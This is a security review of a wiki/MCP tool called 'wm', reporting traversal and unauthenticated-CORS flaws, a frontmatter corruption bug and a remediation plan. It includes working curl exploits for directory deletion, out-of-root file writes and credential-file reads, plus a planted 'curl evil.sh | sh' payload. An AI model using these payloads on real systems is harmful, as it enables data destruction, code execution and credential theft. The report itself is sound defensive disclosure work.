# Security Review — wiki-mem (`wm`)

| | |
|---|---|
| **Date** | 2026-08-04 |
| **Scope** | Full repo: `apps/wm-server`, `apps/wm-core`, `apps/wm-cli`, `apps/wm-web`, `packages/*` |
| **Reviewed revision** | Working tree, files dated 2026-08-03/04 |
| **Published equivalent** | `@something-cabinet/wm-cli@0.3.9` (published 2026-08-03) |
| **Method** | Source reading + live exploitation against `target/debug/wm-server` in a throwaway project |
| **Result** | **5 confirmed vulnerabilities — 2 Critical, 2 High, 1 Medium — plus 1 Critical enabler.** 4 of 5 exploited end-to-end. |
| **Also** | WM-006 — a High-severity correctness defect (wiki frontmatter integrity) found during remediation, reproduced on published 0.3.9. See §8. |

> **Do not commit this file to a public repository before the fixes in §6 ship.** It contains working
> exploit payloads for software that is currently published and unpatched. Keep it local, or in a
> private advisory draft, until patched versions are on npm.

---

## 1. Executive summary

The problem is not a list of bugs. It is that **`wm web` publishes the entire MCP tool registry over
HTTP with no authentication and wildcard CORS.** `/api/tools/{name}` is a generic passthrough to
`ToolRegistry::dispatch_async`, so every tool that exists — and every tool added in future — is
reachable by any web page the user visits while the daemon runs.

Several of those tools perform filesystem operations with no path confinement. The net effect for a
user running `wm web`:

- any website can **recursively delete arbitrary directories** they own,
- any website can **write arbitrary files outside the project root**, including shell rc files and git hooks → code execution,
- any website can **read arbitrary files and exfiltrate the contents** cross-origin (SSH keys, cloud credentials).

Binding to `127.0.0.1` does not mitigate this. A browser can reach loopback, and `Access-Control-Allow-Origin: *`
grants the attacker page permission to *read the responses*. No DNS rebinding is required.

The same tool surface is reachable over MCP stdio, where a prompt-injected agent can invoke it.
Because this product's core function is ingesting wiki content into an agent's context, untrusted
text reaching the tool caller is the expected data flow, not an edge case.

### Aggravating factor: the existing guards are non-functional

This codebase contains security code that does not work, which is more dangerous than absent
security code because it suppresses further scrutiny:

| Guard | Status |
|---|---|
| `test_resolve_page_path_prevents_traversal` (`page/mod.rs:107`) | Asserts the broken predicate. Passes on the traversing path. Permanently green. |
| `sha256` integrity check (`onnx/mod.rs:433`) | Comparison implemented, then made opt-in. Empty hash → warn and continue. |
| `wm_code.file` confinement (`code.rs:660-685`) | **Correct.** Applied to 1 of 7 filesystem boundaries. |

The correct pattern already exists in the repo. It was not applied consistently.

---

## 2. Reachability model

```
malicious web page  ──fetch()──►  http://127.0.0.1:4090/api/tools/{any_tool}
                                   │  no auth layer
                                   │  CorsLayer::permissive()  → ACAO: *  (attacker reads response)
                                   ▼
prompt-injected     ──MCP────►    ToolRegistry::dispatch_async(name, params)
agent (stdio)                      │
                                   ▼
                          49+ tools, incl. filesystem write/delete/read
```

Evidence — `apps/wm-server/src/routes/tools.rs:7-17`:

```rust
pub async fn call_tool(
    State(registry): State<Arc<wm_core::ToolRegistry>>,
    Path(tool_name): Path<String>,
    Json(params): Json<Value>,
) -> Json<Value> {
    match registry.dispatch_async(&tool_name, params).await { ... }
}
```

`apps/wm-server/src/routes/mod.rs:72` — the only layers are CORS and tracing; there is no auth
middleware anywhere in `build_router`:

```rust
        .with_state(state)
        .layer(CorsLayer::permissive())
        .layer(TraceLayer::new_for_http())
```

Verified live:

```
$ curl -i -X OPTIONS http://127.0.0.1:4099/api/tools/wm_page \
    -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST"
HTTP/1.1 200 OK
access-control-allow-methods: *
access-control-allow-headers: *
access-control-allow-origin: *
```

---

## 3. Root cause: `Path::starts_with` does not resolve `..`

Four of the five findings share one misconception. `Path::starts_with` is a **component-wise
comparison**; it performs no normalization, so `..` segments survive the check.

Proof (standalone, reproducing `page_path_helper.rs` logic):

```
input=../../etc/passwd              joined=.wm/wiki/../../etc/passwd.md         starts_with(.wm/wiki)=true
input=../../../../../../tmp/pwned   joined=.wm/wiki/../../../../../../tmp/pwned.md  starts_with(.wm/wiki)=true
input=/etc/passwd                   joined=/etc/passwd.md                       starts_with(.wm/wiki)=false
```

Only the absolute-path case is caught — because `Path::join` with an absolute argument discards the
base, producing a path that genuinely does not start with the wiki dir. The `..` case, which is the
actual traversal primitive, passes.

Sites relying on this broken predicate: `page_path_helper.rs:16`, `doc.rs:233`, `doc.rs:293`,
`doc.rs:341`, `doc.rs:385`.

---

## 4. Findings

### WM-001 — Arbitrary recursive directory deletion — **Critical**

**Location** `apps/wm-core/src/mcp/tools/model.rs:104-118`
**Reachable via** `POST /api/tools/wm_model` (unauthenticated), MCP `wm_model`
**CWE** CWE-22 → CWE-73

`name` is taken from request input, joined onto the models directory with no validation, and passed
to `remove_dir_all`:

```rust
let model_dir = std::path::PathBuf::from(home)
    .join(WM_DIR)
    .join("models")
    .join(&name);          // :110  — unvalidated

if model_dir.exists() {
    std::fs::remove_dir_all(&model_dir)   // :113
```

**Exploit (verified)**

```
$ ls -R /tmp/wmsec/precious
subdir/data.txt

$ curl -s -X POST http://127.0.0.1:4099/api/tools/wm_model \
    -H 'Content-Type: application/json' -H 'Origin: https://evil.com' \
    -d '{"action":"remove","name":"../../../precious"}'
{"data":{"model_name":"../../../precious","status":"removed"},"success":true}

$ ls -R /tmp/wmsec/precious
ls: /tmp/wmsec/precious: No such file or directory
```

With a real `$HOME`, `../../<user>/Documents` reaches any directory the user can delete. Note there
is no confirmation, no dry-run, and the tool reports `"status":"removed"` on success.

**Fix** `download_model` already validates `name` against `MODEL_REGISTRY` (`onnx/mod.rs:377`).
Apply the same allowlist on remove. Do not rely on path confinement for this one — an allowlist is
strictly correct here since the set of valid names is finite and known.

---

### WM-002 — Arbitrary file write outside project root via template runner — **Critical**

**Location** `apps/wm-core/src/mcp/tools/template/mod.rs:346` (`add`), `:452` (`modify`), `:491` (`append`), `:385` (`addMany`)
**Reachable via** `POST /api/tools/wm_template` (unauthenticated), MCP `wm_template`
**CWE** CWE-22 → CWE-94

Caller-supplied `variables` are substituted directly into the destination path, then joined with no
confinement check:

```rust
let output_path = render_path(&action.path, ctx);   // ctx contains caller `variables`
let full_path = dest_dir.join(&output_path);        // :346 — no validation
...
std::fs::write(&full_path, &rendered.output)
```

`render_path` (`:527-552`) performs raw `{{var}}` string substitution with no sanitization — no
rejection of `..`, no rejection of absolute paths, no separator filtering:

```rust
let value = match ctx.get(var_name) {
    Some(serde_json::Value::String(s)) => s.clone(),
    ...
};
result.push_str(&value);
```

**Exploit (verified)** — against a benign template whose path is `docs/{{name}}.txt`:

```
$ curl -s -X POST http://127.0.0.1:4099/api/tools/wm_template \
    -H 'Content-Type: application/json' -H 'Origin: https://evil.com' \
    -d '{"action":"run","name":"mytmpl","variables":{"name":"../../fakehome/.zshrc-pwn"}}'
{"data":{"results":[{"action":"add","path":"docs/../../fakehome/.zshrc-pwn.txt",
  "size":32,"status":"created"}]},"success":true}

$ cat /tmp/wmsec/fakehome/.zshrc-pwn.txt
hello ../../fakehome/.zshrc-pwn
```

**Escalation to code execution.** In the PoC the extension came from the template's `path` pattern.
A template written as `path: "{{name}}"` — an ordinary scaffolding idiom — gives the caller full
control of directory, basename *and* extension. Targets: `~/.zshrc`, `~/.bashrc`,
`.git/hooks/pre-commit`, `~/.ssh/authorized_keys`. File content is also attacker-controlled through
`variables`.

**Second vector.** `config.destination` (`:287`) comes from the repo's own
`.wm/templates/{name}/_template.yaml` and is joined unvalidated at `:290`:

```rust
let destination = config.destination.as_deref().unwrap_or(".");
let dest_path = resolve_root(engine)?.join(destination);
```

A malicious or PR-poisoned repo can therefore relocate the write root before any variable is
involved. Cloning a hostile repo and running a template is enough.

**Fix** Confine `full_path` at all four write sites. Reject rendered path segments containing `..`
or a root prefix *before* joining, and validate `destination` at `:290`.

---

### WM-003 — Arbitrary `.md` write/overwrite outside project root — **High**

**Location** `apps/wm-core/src/page/helpers/page_path_helper.rs:7-20` and `:35`; `apps/wm-core/src/mcp/tools/doc.rs:233/293/341/385`
**Reachable via** `POST /api/tools/wm_page`, `POST /api/tools/wm_doc` (unauthenticated), MCP
**CWE** CWE-22

```rust
pub fn resolve_page_path(_project_name: &str, path: &str) -> ToolResult<PathBuf> {
    let wiki_dir = Path::new(WM_DIR).join(WIKI_DIR);
    let file_path = if path.ends_with(".md") {
        wiki_dir.join(path.trim_start_matches("wiki/"))
    } else {
        let path_part = path.replace(':', "/");
        wiki_dir.join(format!("{}.md", path_part.trim_start_matches("wiki/")))
    };

    if !file_path.starts_with(&wiki_dir) {      // :16 — see §3, ineffective against ..
        return Err(ToolError::required_field("path"));
    }
    Ok(file_path)
}
```

`wm_page` `Create` takes `path: String` straight from request input (`page/action.rs:21-23`).

**Exploit (verified)**

```
$ curl -s -X POST http://127.0.0.1:4099/api/tools/wm_page \
    -H 'Content-Type: application/json' -H 'Origin: https://evil.com' \
    -d '{"action":"create","path":"../../../fakehome/.evilrc","title":"x","content":"curl evil.sh | sh"}'
{"data":{"id":"wiki:..:..:..:fakehome:.evilrc","path":"../../../fakehome/.evilrc",
  "type":"concept"},"success":true}

$ cat /tmp/wmsec/fakehome/.evilrc.md
---
title: x
type: concept
id: wiki:..:..:..:fakehome:.evilrc
---

curl evil.sh | sh
```

Overwrite of an existing out-of-root file was also confirmed (`/tmp/wmsec/outside/victim.md`,
contents replaced with attacker text). `.md` is force-appended (also by `doc.rs:12 ensure_md_ext`),
so the impact is bounded to creating/clobbering `*.md` anywhere the user can write — destructive and
a vector for poisoning docs another agent will read, but not directly RCE. `doc.rs:393`
(`remove_file`) makes arbitrary `*.md` **deletion** reachable the same way.

`resolve_simple_page_path` (`:35`) has **no confinement check at all**.

---

### WM-004 — Arbitrary file read and cross-origin exfiltration — **High**

**Location** `apps/wm-core/src/source_service.rs:13-25`; surfaced by `apps/wm-core/src/mcp/tools/source.rs:57-59`
**Reachable via** `POST /api/tools/wm_source` (unauthenticated), MCP `wm_source`
**CWE** CWE-22 → CWE-200

```rust
pub fn add_source(engine: &Arc<EngineState>, original_path: &str) -> ToolResult<String> {
    ...
    let src_path = Path::new(original_path);     // :19  — no root confinement
    if !src_path.exists() { ... }
    let content = std::fs::read(src_path)        // :24
```

`wm_source process` then returns the bytes in the HTTP response body
(`source.rs:58 claim_source_and_read_content`).

**Exploit (verified)**

```
$ curl -s -X POST .../api/tools/wm_source -d '{"action":"add","path":"/tmp/wmsec/outside/secrets.env"}'
{"data":{"id":"src_f7b14dec","state":"pending"},"success":true}

$ curl -s -X POST .../api/tools/wm_source -d '{"action":"process","id":"src_f7b14dec"}'
{"data":{"content":"secret-token-ABC123\n","id":"src_f7b14dec"},"success":true}

$ # absolute paths outside the project work directly:
$ curl -s -X POST .../api/tools/wm_source -d '{"action":"add","path":"/etc/hosts"}'
$ curl -s -X POST .../api/tools/wm_source -d '{"action":"process","id":"src_c7dd0e2e"}'
{"data":{"content":"##\n# Host Database\n#\n...127.0.0.1\tlocalhost\n..."}}
```

Because `Access-Control-Allow-Origin: *`, the attacker page reads the response body directly.
`~/.ssh/id_rsa`, `~/.aws/credentials`, `.env` files are all in reach.

**Contrast** `wm_code.file` (`code.rs:660-685`) implements this correctly — canonicalize both sides,
`starts_with` on canonicalized paths, plus a dotfile/hidden-directory block, and its docstring
states "confined to the project root." Port that guard to `add_source`.

---

### WM-005 — Model download integrity verification disabled — **Medium**

**Location** `packages/wm-embed/src/services/onnx/mod.rs:353-367`, `:427-436`
**CWE** CWE-494 (download of code without integrity check)

Both registry entries ship an empty expected hash:

```rust
ModelEntry {
    name: "bge-small-en-v1.5",
    url: "https://huggingface.co/BAAI/bge-small-en-v1.5/resolve/main/onnx/model.onnx",
    // TODO: Set real SHA-256 hash here or via WM_MODEL_SHA env var
    sha256: "",     // :359, and :366 for all-MiniLM-L6-v2
},
```

and the empty case warns and proceeds:

```rust
if expected.is_empty() {
    // Model integrity verification not yet implemented
    println!("  ⚠ Model integrity verification not yet implemented — set WM_MODEL_SHA={} to verify", hash_hex);
} else if hash_hex != expected { ... }
```

The hash is computed, printed, and discarded. The downloaded `.onnx` is then loaded into the ORT
runtime, i.e. an unverified computation graph from a third-party CDN is executed. HTTPS to
HuggingFace is the only control; a compromised upstream artifact, a hostile mirror, or a
`WM_MODEL_SHA` set by an attacker-controlled environment is accepted silently.

**Fix** Populate both hashes; make an empty expected hash a hard error rather than a warning. Keep
`WM_MODEL_SHA` for local development only, or remove it — an env var that *overrides* pinned
integrity is itself a weakness.

---

## 5. Lower-priority and clean results

### Dependencies

Verified via `npm audit --omit=dev --package-lock-only` in `apps/wm-web`:

| Package | Severity | Advisory |
|---|---|---|
| `fast-uri` 3.0.0–3.1.4 | High | GHSA-7p8r-x3mc-p8w7 — host confusion via backslash authority introducer |
| `postcss` ≤8.5.22 | Moderate | GHSA-fxqj-rqcc-2cmp — attacker-controlled `sourceMappingURL` reads arbitrary `.map` files |

Both fixable with a non-breaking lockfile bump. `apps/wm-web-e2e` production deps: 0 vulnerabilities.
Remaining 15 high advisories across both apps are dev-only build tooling (nx, axios, undici,
serialize-javascript, brace-expansion, ip-address, codeceptjs).

`serde_yaml 0.9.34+deprecated` (`Cargo.lock`) is **unmaintained** — RUSTSEC-2024-0320. Migrate to
`serde_yaml_ng` or `serde_norway`.

**Not verified:** `cargo audit` is not installed, so the Rust dependency set has **not** been
authoritatively scanned. Manual inspection of notable crates in `Cargo.lock` (openssl 0.10.81,
ring 0.17.14, rustls 0.23.42, tokio 1.52.4, hyper 1.10.1, time 0.3.53, idna 1.1.0, shlex 1.3.0)
showed versions past known RUSTSEC fixes, but this is not a substitute. **Run `cargo audit` and
add it to CI.**

### Supply chain

`spartan-ng-brain-1.1.0.tgz` (438 KB) is git-tracked but referenced by **no** `package.json` or
lockfile entry — `apps/wm-web/package-lock.json:8910` resolves `@spartan-ng/brain` to registry
`brain-1.1.1.tgz`. It is orphaned, already version-drifted, and bypasses lockfile integrity and
provenance. Delete it. If vendoring is ever needed, reference it via `file:` with an integrity hash.

### Clean (verified, with what was checked)

| Area | Result |
|---|---|
| Frontend XSS | **Clean.** Zero matches for `innerHTML`, `bypassSecurityTrust*`, `DomSanitizer`, `eval`, `new Function`, `document.write`, `insertAdjacentHTML` in `apps/wm-web/src`. |
| Markdown → HTML | **No HTML sink exists.** `md-parse.service.ts:21` returns plain `{frontmatter, body}` strings; content renders via escaped interpolation (`pages-view.component.ts:78`, `code-view.component.ts:284`). No marked/markdown-it/ngx-markdown dependency. |
| URL sinks | **Clean.** No `window.open`, no `location` assignment. Navigation uses array-form `[routerLink]`, which cannot execute `javascript:` URIs. |
| SQL injection | **Clean.** `packages/wm-code-intel/src/services/code_index_db.rs` uses `?` placeholders / `params_from_iter` throughout; `escape_like` handles wildcards; the only `format!` into SQL is a numeric `LIMIT {usize}`. |
| Command injection | **Clean.** `packages/wm-lsp` (`detect.rs`, `manager.rs`, `adapters.rs`) uses hardcoded binary names and args resolved via `$PATH`. No config- or workspace-controlled binary path. |
| Memory safety | **Clean.** No `unsafe` blocks, `unsafe fn`, or `extern "C"` in the workspace. |
| Archive extraction | **Clean.** No zip/tar extraction anywhere → no zip-slip. |
| Handler panics | Mitigated for sync handlers by `catch_unwind` in `mcp/transport.rs:252`. |
| Secrets in repo | **Clean.** No `AKIA`, no private key blocks, no `ghp_`/`xox`/`sk_live`/`AIza` tokens, no tracked `.env`, no committed `.npmrc`. |
| CI secret handling | Correct. `ci.yml:145` writes `~/.npmrc` from `secrets.NPM_TOKEN` inside a **tag-gated** publish job (`ci.yml:5` `tags: [v*]`). No `pull_request_target`. The `pull_request` trigger runs only `check` and has no token access. |

**CI hardening (not vulnerabilities):** add a top-level `permissions: contents: read` block — there
is none anywhere in `ci.yml`; add `.env` to `.gitignore`; add `cargo audit` and `npm audit` gates.

**Frontend hardening:** `index.html` has no Content-Security-Policy. Not currently exploitable
because no HTML sink exists, but a CSP would contain any future regression. The existing inline
theme `<script>` needs a nonce or hash under a strict policy.

---

## 6. Remediation plan

Ordered by risk reduction per unit of work. **Do not start with the dependency bumps** — they are
one command, they feel like progress, and they fix nothing that matters here.

### Phase 0 — Contain (today)

1. `npm deprecate` the affected published versions with a message pointing at the advisory. Do
   **not** unpublish: that breaks consumers' lockfiles without protecting anyone already installed.
2. Ship a patch release that makes `wm web` refuse to start without an auth token. This alone closes
   the browser-reachable path for all of WM-001 through WM-004.
3. Verify whether the published 0.3.9 tarball matches the reviewed working tree. This review covered
   the tree, not the artifact.

### Phase 1 — Close the HTTP surface

4. Generate a random token at `wm web` startup; require it on every `/api/*` route; pass it to the
   SPA at load. Reject requests without it.
5. Replace `CorsLayer::permissive()` (`routes/mod.rs:72`) with an explicit origin allowlist. Add an
   `Origin` / `Sec-Fetch-Site` check so cross-site requests are rejected outright.
6. Stop exposing the registry generically. `/api/tools/{name}` (`routes/tools.rs`) should consult an
   explicit allowlist of read-only, browser-safe tools. `wm_template run`, `wm_model remove`,
   `wm_page delete`, `wm_doc delete`, and `wm_source` have no business being reachable from a
   `fetch()` regardless of authentication.

### Phase 2 — Fix path handling properly

7. Add one shared helper and make it the **only** sanctioned way to turn request input into a path:

```rust
/// Resolve `candidate` against `root`, rejecting anything that escapes it.
/// Resolves `..` lexically so it works for files that do not exist yet.
fn confine(root: &Path, candidate: &Path) -> ToolResult<PathBuf> {
    let root = root.canonicalize()
        .map_err(|e| ToolError::io_error("canonicalize", root.to_string_lossy(), e))?;
    let joined = root.join(candidate);
    let resolved = normalize_lexically(&joined); // collapse `.` and `..` without touching disk
    if !resolved.starts_with(&root) {
        return Err(ToolError::invalid_params("path escapes project root"));
    }
    Ok(resolved)
}
```

   Lexical normalization is required rather than `canonicalize` alone, because create-paths do not
   yet exist on disk. If symlink-following matters for your threat model, canonicalize the deepest
   existing ancestor and re-append the tail.

8. Call sites to convert:

   | File | Line(s) | Finding |
   |---|---|---|
   | `page/helpers/page_path_helper.rs` | 16, 35 | WM-003 |
   | `mcp/tools/doc.rs` | 233, 293, 341, 385 | WM-003 |
   | `mcp/tools/template/mod.rs` | 346, 385, 452, 491 | WM-002 |
   | `mcp/tools/template/mod.rs` | 290 (`destination`) | WM-002 |
   | `mcp/tools/model.rs` | 110 (use `MODEL_REGISTRY` allowlist) | WM-001 |
   | `source_service.rs` | 19 | WM-004 |

9. Make a bare `.join()` on request-derived data a review failure. Consider a newtype
   (`UnsafeUserPath`) that only `confine` can unwrap, so the compiler enforces the chokepoint
   instead of relying on reviewer memory.

### Phase 3 — Repair the test suite

10. Rewrite `test_resolve_page_path_prevents_traversal` (`page/mod.rs:107-131`) to assert `Err`. It
    currently reads:

```rust
match result {
    Ok(path) => assert!(path.starts_with(".wm/wiki"), ...),   // passes on .wm/wiki/../../etc/passwd.md
    Err(_) => {}                                              // also passes
}
```

    A test that accepts both `Ok` and `Err`, and only weakly constrains `Ok`, asserts nothing. Grep
    the suite for this shape — `match ... { Ok(_) => assert!(weak), Err(_) => {} }` — and fix every
    instance.
11. Add regression tests per finding, asserting rejection of: `../`, absolute paths, `..` embedded
    mid-path, and (for WM-002) `..` arriving through template `variables`.

### Phase 4 — Everything else

12. Populate both SHA-256 hashes; empty expected hash → hard error (WM-005).
13. Bump `fast-uri` and `postcss`; migrate off `serde_yaml`.
14. Delete `spartan-ng-brain-1.1.0.tgz`.
15. Install and run `cargo audit`; add `cargo audit` + `npm audit` to CI.
16. Add `permissions: contents: read` to `ci.yml`; add a CSP to `index.html`.

---

## 7. Assessment

None of these findings required creativity. Wildcard CORS on an unauthenticated tool dispatcher is
the first thing any reviewer examines, and four of the five were confirmed with `curl` in roughly ten
minutes using a binary already present in `target/debug`. Assume that anyone who wanted to find them
has.

The structural issue worth internalizing is that `/api/tools/{name}` as a generic registry
passthrough means the security posture of the HTTP API is defined by the *least careful tool in the
registry*, and it degrades automatically every time a tool is added. Phase 1 step 6 — an explicit
allowlist — is the fix that stops this recurring, and it matters more than any individual path check.

---

## 8. WM-006 — Wiki frontmatter integrity: divergent writers and silent parse failure

**Severity: High (correctness, not security).** Found while creating this review's own task pages
using the tools. Reproduced on **`@something-cabinet/wm-cli@0.3.9`** — the current published
release — not just the local debug build (0.3.7).

Not a vulnerability: no attacker, no privilege boundary crossed. Recorded here because it was
discovered during remediation, it silently corrupts the knowledge base the agents depend on, and it
blocks the `findings-first-task-spec` workflow this remediation is required to follow.

### 8.1 The three creation/update paths disagree

Verified on 0.3.9 in a scratch project:

| Writer | Frontmatter emitted |
|---|---|
| CLI `wm-cli page create` | `title`, `type`, `status: draft` — **no `id:`** |
| MCP `wm_page` `create` | `title`, `type`, `id:` — **no `status:`** |
| CLI/MCP `page update` | preserves whitelist only — **strips `id:`** |

```
$ echo "Body." | wm-cli page create "specs/id-probe" "Id Probe" --page-type spec
$ head -5 .wm/wiki/specs/id-probe.md
---
title: Id Probe
type: spec
status: draft          # no id:
---

$ # same version, MCP path:
$ wm-cli mcp < req.jsonl   # tools/call wm_page {action:create,...}
{"jsonrpc":"2.0","id":2,"result":{"content":[{"type":"text","text":
  "{\"id\":\"wiki:specs:id-probe-mcp\",\"path\":\"specs/id-probe-mcp\",\"type\":\"spec\"}"}]}}
$ head -5 .wm/wiki/specs/id-probe-mcp.md
---
title: Id Probe MCP
type: spec
id: wiki:specs:id-probe-mcp    # no status:
---

$ echo '{"status":"approved","tags":["probe"]}' | wm-cli page update "wiki:specs:id-probe-mcp"
Updated: wiki:specs:id-probe-mcp
$ head -6 .wm/wiki/specs/id-probe-mcp.md
---
title: Id Probe MCP
type: spec
status: approved
tags: [probe]                  # id: has been DESTROYED
---
```

The update behaviour is already documented as **RC-2** of
`wiki:tasks:wm-task-update-frontmatter-corruption` (status `in-progress`, priority high):
`frontmatter_to_yaml` emits only a whitelist of modeled fields, so unknown keys parse to `None` and
are dropped on re-serialisation. AC-3 of that task covers it. **This review adds the evidence that
it is unfixed in the latest published release, and that the two `create` paths also diverge** — the
existing task covers `update` only.

### 8.2 The documented workaround manufactures the corruption

That task records a workaround: frontmatter *"survives only when embedded verbatim in the content
argument."* It does not work. `page create` always writes its own block first, so verbatim content
yields **two YAML documents**:

```
$ wm-cli page create "specs/workaround-probe" "Workaround Probe" --page-type spec < with-fm.md
$ cat .wm/wiki/specs/workaround-probe.md
---
title: Workaround Probe
type: spec
status: draft
---

---                                   # second document — file no longer parses
title: Workaround Probe
id: wiki:specs:workaround-probe
type: spec
status: approved
priority: high
tags: [probe, verbatim]
---
```

This is the direct cause of the parse errors `wm-cli lint check` emits against the real wiki:

```
WARN wm_core::parser: Frontmatter parse error: deserializing from YAML containing more than
  one document is not supported
WARN wm_core::parser: Frontmatter parse error: mapping values are not allowed in this context
  at line 3 column 15 — content starts with: ---\nid: wiki:patterns:field-weighted-bm25
```

### 8.3 `page link` destroys frontmatter — RC-3 reproduced on 0.3.9

The existing task lists RC-3 (`{}` frontmatter emission) as a *candidate* root cause needing
confirmation. It is confirmed. Creating this remediation's task pages and linking one to its spec:

```
$ grep -c '^---$' .wm/wiki/tasks/wm001-....md
2                                          # clean, single frontmatter block
$ head -5 .wm/wiki/tasks/wm001-....md
---
title: 'WM-001: Arbitrary recursive directory deletion via wm_model remove'
type: task
status: todo
---

$ wm-cli page link "wiki:tasks:wm001-..." "wiki:specs:security-remediation" --edge-type implements

$ head -10 .wm/wiki/tasks/wm001-....md
---
{}                                         # frontmatter replaced with empty map
relates_to:
  - {type: implements, target: wiki:specs:security-remediation}
---

---                                        # original block demoted to a 2nd document
title: 'WM-001: Arbitrary recursive directory deletion via wm_model remove'
type: task
status: todo
$ grep -c '^---$' .wm/wiki/tasks/wm001-....md
4                                          # 2 -> 4
```

`title`, `type`, and `status` are gone from the parsed frontmatter. The page now deserialises as an
empty `Frontmatter`, so `parse_page_type` falls through to `PageType::Concept` — the task becomes
invisible to `wm_page.list({"type":"task"})` and to the task board. **A single `page link` call
silently converts a task into an unparseable concept.**

This is the mechanism behind the 8 corrupted task files described in the existing bug report, and it
reproduces on the current published release with one command. Recovery required
`page delete` + `page create`; there is no repair path through the tools.

### 8.4 Blast radius in this repository

**73 of 582 wiki pages (12.5%)** contain four or more `---` markers, i.e. duplicated frontmatter:

```
$ find .wm/wiki -name '*.md' | while read f; do
    n=$(grep -c '^---$' "$f"); [ "$n" -ge 4 ] && echo "$f"; done | wc -l
73
```

Worst affected include `specs/onnx-embedding-integration.md` (10), `specs/obsidian-graph-view.md`
(10), `rules/rust-anti-patterns.md` (10), `reference/design-patterns.md` (9),
`patterns/cargo-npm-github-actions.md` (8). **`core/critical-patterns.md` is among them** — the
project's own "costliest lessons" page currently has two frontmatter blocks.

`graph stats` output also shows live instances of RC-3 (`{}` emission) and outright field
truncation:

```
id: concepts/pagerepo-tra        # truncated mid-value
{}
tags: [deployment, npm, removal]
```

### 8.5 Why this matters beyond tidiness

Per `@wiki/core/critical-patterns`, `extract_frontmatter` swallows parse errors and
`parse_page_type` falls through to `_ => PageType::Concept`. A page with duplicated frontmatter
therefore **silently becomes a `concept`** — invisible to `wm_page.list({"type":"rule"})`,
absent from type-filtered search, and miscounted in `wm_graph.stats`. This is the exact failure
that previously hid 4 of 8 rule files. With 73 pages affected the graph is materially wrong, and
agents relying on `wm_initial` are being fed an incomplete rule set.

### 8.6 Remediation

Do **not** file a new task — annotate the existing `wiki:tasks:wm-task-update-frontmatter-corruption`,
per `@wiki/rules/check-wm-tool-health-before-work` ("if a known bug already has a task, don't
duplicate"). Add:

1. 0.3.9 reproduction evidence for RC-2 via the **CLI** `page update` path.
2. A new root cause **RC-4: `create` writers diverge** — CLI omits `id:`, MCP omits `status:`.
   Both should emit the same complete frontmatter.
3. A new root cause **RC-5: `page create` does not detect frontmatter in the content argument**, so
   the documented workaround produces two YAML documents. It should either merge the supplied
   frontmatter or reject the input.
4. A repair task for the 73 affected pages, followed by `wm_index.rebuild`.
5. Make `extract_frontmatter` surface duplicate-document errors loudly rather than returning `None`
   — the two-layer guard (`wm_lint.check` + integration test) from
   `@wiki/decisions/lint-plus-integration-tests-for-wiki-health` should assert single-document
   frontmatter and presence of `id:`. `lint check` currently reports only Nodes/Edges/Orphans and
   does not flag either condition.

**Caveat:** annotating that task requires `page update`, which is the very code path that strips
fields. Annotate by hand or fix RC-2 first — do not use `page update` on an in-progress
high-priority task page.

---

## Appendix A — Reproduction environment

```bash
mkdir -p /tmp/wmsec/proj/.wm/wiki/specs /tmp/wmsec/fakehome
cd /tmp/wmsec/proj
echo '{"project_name":"sec"}' > .wm/config.json
HOME=/tmp/wmsec/fakehome ./target/debug/wm-server --port 4099 &
```

`HOME` is overridden so the WM-001 deletion PoC cannot touch the real home directory. All
exploitation was performed against `/tmp/wmsec/*`; all artifacts were removed afterwards.

## Appendix B — Finding index

| ID | Severity | Title | Primary location | Exploited |
|---|---|---|---|---|
| WM-000 | Critical (enabler) | Unauthenticated tool dispatch + wildcard CORS | `wm-server/src/routes/mod.rs:72`, `routes/tools.rs:7` | Yes |
| WM-001 | Critical | Arbitrary recursive directory deletion | `mcp/tools/model.rs:110` | Yes |
| WM-002 | Critical | Arbitrary file write outside project root | `mcp/tools/template/mod.rs:346` | Yes |
| WM-003 | High | Arbitrary `.md` write/overwrite/delete outside root | `page_path_helper.rs:16`, `doc.rs:233` | Yes |
| WM-004 | High | Arbitrary file read + cross-origin exfiltration | `source_service.rs:19` | Yes |
| WM-005 | Medium | Model download integrity check disabled | `onnx/mod.rs:359` | No (code review) |
| WM-006 | High (correctness) | Frontmatter: divergent writers, `update` strips `id:`, workaround yields 2 YAML docs; 73/582 pages affected | `parser/mod.rs` `frontmatter_to_yaml`, `page_update_builder_service.rs` | Yes (on 0.3.9) |
